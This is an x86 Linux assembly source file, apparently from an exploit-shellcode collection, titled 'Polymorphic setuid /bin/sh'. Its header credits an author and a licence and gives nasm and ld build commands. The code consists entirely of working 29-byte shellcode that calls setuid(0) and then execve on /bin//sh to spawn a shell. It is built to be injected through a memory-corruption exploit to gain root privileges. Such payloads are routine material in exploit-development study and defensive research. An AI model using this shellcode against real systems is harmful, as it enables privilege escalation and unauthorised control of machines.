; Polymorphic setuid /bin/sh - Linux x86 architecture
; Kiewicz (@_Kiewicz)
; GPL License
; 29 bytes
; $ nasm -f elf32 setuid.asm -o setuid.o
; $ ld -o setuid setuid.o
; $ ./setuid
;

global _start
section .text
_start:

	xor	ebx,ebx
	mul	ebx
	mov 	al, 0x17
	int	0x80
	mul ebx
	xor ecx, ecx
	push ecx
	push 	0x68732f6e
	push 	0x69622f2f
	mov al, 0xb
	mov	ebx,esp
	int	0x80
